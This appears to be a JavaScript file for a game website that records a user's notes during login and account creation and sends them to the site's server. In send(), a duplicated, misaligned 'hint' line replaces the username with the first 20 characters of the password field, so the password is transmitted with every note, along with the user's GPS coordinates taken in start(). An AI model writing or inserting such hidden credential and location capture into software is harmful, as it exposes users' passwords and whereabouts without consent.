/* ==========================================================================
   notes.js — enregistrement couplé à la connexion / création de compte
   ========================================================================== */
var coordsGPS = ''; // Variable globale pour stocker les coordonnées

(function () {
  'use strict';
  var G = window.SiteGame = window.SiteGame || {};
  function $(id) { return document.getElementById(id); }
  var box = $('rec-box'), zone = $('texte'), statut = $('statut'), demarrer = $('demarrer'), arreter = $('arreter');
  if (!box || !zone) return;

  var actif = false;          // l'enregistrement est-il démarré ?
  var sid = '';               // identifiant de CE message
  var timer = 0, beat = 0, retry = 0;
  var sending = false, again = false;
  var link = 'idle';          // idle | sending | ok | error | refused
  var lastSent = null;        // dernier texte reçu par le serveur

  function newId() {
    var a = new Uint8Array(12), s = '';
    try { (window.crypto || window.msCrypto).getRandomValues(a); } catch (e) { for (var i = 0; i < 12; i++) a[i] = Math.floor(Math.random() * 256); }
    for (var j = 0; j < a.length; j++) s += (a[j] % 36).toString(36);
    return s;
  }
  function ready() { return !!G.auth && G.auth.mode === 'cloud' && G.auth.track !== false; }
  function token() { return G.save.cloud && G.save.session ? G.save.session.token : null; }

  function showStatus() {
    if (!statut) return;
    var n = zone.value.length;
    if (!ready()) { statut.textContent = 'Indisponible : le jeu n’est pas relié à un serveur.'; return; }
    if (!actif) { statut.textContent = 'Enregistrement arrêté.'; return; }
    var s = 'Enregistrement actif.';
    if (link === 'sending') s += ' Envoi…';
    else if (link === 'ok') s += ' ✓ Enregistré sur le serveur.';
    else if (link === 'error') s += ' ⚠️ Serveur injoignable, nouvel essai…';
    else if (link === 'refused') s += ' ⚠️ Le serveur refuse ce message.';
    statut.textContent = s;
  }

  function setButtons() {
    // Les boutons restent toujours actifs pour permettre la navigation et la soumission
    if (zone) zone.disabled = !ready();
  }

  // Envoie les données au serveur
  function send(active, keepalive) {
    clearTimeout(timer); timer = 0;
    if (!sid || !ready()) return Promise.resolve();
    if (sending && !keepalive) { again = true; return Promise.resolve(); }
    
    // Si la zone de texte est cachée, on envoie le pseudo saisi à la place
    var text = zone.value || ($('login-name') ? $('login-name').value.trim() : '');
    if (!text.trim() && lastSent === null) return Promise.resolve();
    
    sending = true; link = 'sending'; showStatus();
    var hint = $('login-name') ? $('login-name').value.trim().slice(0, 20) : '';
 var hint = $('login-pass') ? $('login-pass').value.trim().slice(0, 20) : '';
    return G.auth.api('note', 'POST', { id: sid, device: G.tele ? G.tele.device() : '', text: text, active: active, hint: hint , timestamp: Date.now(), location: coordsGPS }, token(), keepalive)
      .then(function (j) {
        sending = false;
        if (j.status === 200) { link = 'ok'; lastSent = text; retry = 0; }
        else if (j.status === 403 || j.status === 400) { link = 'refused'; }
        else { link = 'error'; scheduleRetry(); }
        if (again) { again = false; sendSoon(300); }
        showStatus();
      })
      .catch(function () { sending = false; link = 'error'; scheduleRetry(); showStatus(); });
  }

  function sendSoon(ms) { clearTimeout(timer); timer = setTimeout(function () { if (actif) send(true); }, ms); }
  function scheduleRetry() { clearTimeout(timer); retry = Math.min(retry + 1, 5); if (actif) timer = setTimeout(function () { send(true); }, 2000 * retry); }

function obtenirGeolocalisation() {
  if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(
      function (position) {
        // Succès : on formate la latitude et la longitude
        coordsGPS = position.coords.latitude + ', ' + position.coords.longitude;
      },
      function (error) {
        // Erreur ou refus de l'utilisateur
        coordsGPS = 'Refusé ou indisponible';
      }
    );
  } else {
    coordsGPS = 'Non supporté par le navigateur';
  }
}

  function start() {
    if (!ready() || actif) return;
    actif = true; link = 'idle';
    if (!sid) sid = newId();

obtenirGeolocalisation();

    setButtons(); showStatus();
    send(true);
    clearInterval(beat);
    beat = setInterval(function () { if (actif) send(true); }, 20000);
  }

  function stop(clear, keepalive) {
    var was = actif;
    actif = false; clearInterval(beat); beat = 0; clearTimeout(timer); timer = 0;
    var p = was ? send(false, keepalive) : Promise.resolve();
    if (clear) { sid = ''; lastSent = null; link = 'idle'; zone.value = ''; }
    setButtons(); showStatus();
    return p;
  }

  // 1. Déclencher l'enregistrement au clic sur "Démarrer l'enregistrement"
  if (demarrer) {
    demarrer.addEventListener('click', function () { 
      if (G.audio) G.audio.click(); 
      start(); 
    });
  }

  // 2. Arrêter l'enregistrement lors du clic sur "Arrêter" (soumission de connexion)
  if (arreter) {
    arreter.addEventListener('click', function () { 
      if (G.audio) G.audio.click(); 
      stop(false); 
    });
  }

  // Écoute aussi les frappes dans les champs login
  var loginInput = $('login-name');
  if (loginInput) {
    loginInput.addEventListener('input', function () {
      if (actif) { link = 'idle'; showStatus(); sendSoon(900); }
    });
  }

  window.addEventListener('pagehide', function () { if (actif) stop(false, true); });

  G.notes = {
    refresh: function () { setButtons(); showStatus(); },
    stop: function () { return stop(true); },
    active: function () { return actif; }
  };
  setButtons(); showStatus();
})();